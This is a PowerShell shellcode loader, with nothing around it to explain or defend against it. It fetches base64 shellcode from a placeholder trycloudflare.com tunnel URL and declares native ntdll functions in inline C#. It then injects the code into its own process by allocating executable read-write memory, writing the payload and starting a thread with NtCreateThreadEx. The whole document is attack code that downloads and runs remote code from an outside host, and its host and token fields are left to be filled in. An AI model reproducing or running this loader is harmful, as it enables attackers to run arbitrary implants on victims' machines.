$u="https://CHANGE-MECHANGE-ME.trycloudflare.com/payloads/shellcode.txt?key=PLACEHOLDER_TOKEN"
[Net.ServicePointManager]::SecurityProtocol="Tls12"

$c=@"
using System;using System.Runtime.InteropServices;
public class T{
[DllImport("ntdll.dll")]public static extern uint NtAllocateVirtualMemory(IntPtr h,ref IntPtr b,IntPtr z,ref IntPtr s,uint t,uint p);
[DllImport("ntdll.dll")]public static extern uint NtWriteVirtualMemory(IntPtr h,IntPtr b,byte[] buf,uint sz,ref uint w);
[DllImport("ntdll.dll")]public static extern uint NtProtectVirtualMemory(IntPtr h,ref IntPtr b,ref IntPtr s,uint np,ref uint op);
[DllImport("ntdll.dll")]public static extern uint NtCreateThreadEx(ref IntPtr t,uint a,IntPtr oa,IntPtr h,IntPtr r,IntPtr arg,uint f,IntPtr zb,IntPtr sc,IntPtr sr,IntPtr ab);
[DllImport("kernel32.dll")]public static extern IntPtr CreateProcessW(string app,string cmd,IntPtr pa,IntPtr ta,bool ih,uint cf,IntPtr env,string cd,ref SI si,ref PI pi);
[DllImport("kernel32.dll")]public static extern IntPtr GetCurrentProcess();
[StructLayout(LayoutKind.Sequential)]public struct SI{public int cb;public IntPtr r,d,t;public int x,y,w,h,xc,yc,fa;public short sw,r2;public IntPtr r3,si,so,se;}
[StructLayout(LayoutKind.Sequential)]public struct PI{public IntPtr hP,hT;public int pI,tI;}
}
"@
Add-Type $c

$sc=[Convert]::FromBase64String((New-Object Net.WebClient).DownloadString($u))

# Self-inject into current PowerShell process (simpler, more reliable)
$h=[T]::GetCurrentProcess()

# Allocate RWX memory
$a=[IntPtr]::Zero;$sz=[IntPtr]$sc.Length
[T]::NtAllocateVirtualMemory($h,[ref]$a,[IntPtr]::Zero,[ref]$sz,0x3000,0x40)|Out-Null
if($a -eq [IntPtr]::Zero){return "ALLOC FAIL"}

# Write shellcode
$w=[uint32]0
[T]::NtWriteVirtualMemory($h,$a,$sc,[uint32]$sc.Length,[ref]$w)|Out-Null

# Create thread in current process
$t=[IntPtr]::Zero
[T]::NtCreateThreadEx([ref]$t,0x1FFFFF,[IntPtr]::Zero,$h,$a,[IntPtr]::Zero,0,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero)|Out-Null
if($t -eq [IntPtr]::Zero){return "THREAD FAIL"}
"OK"
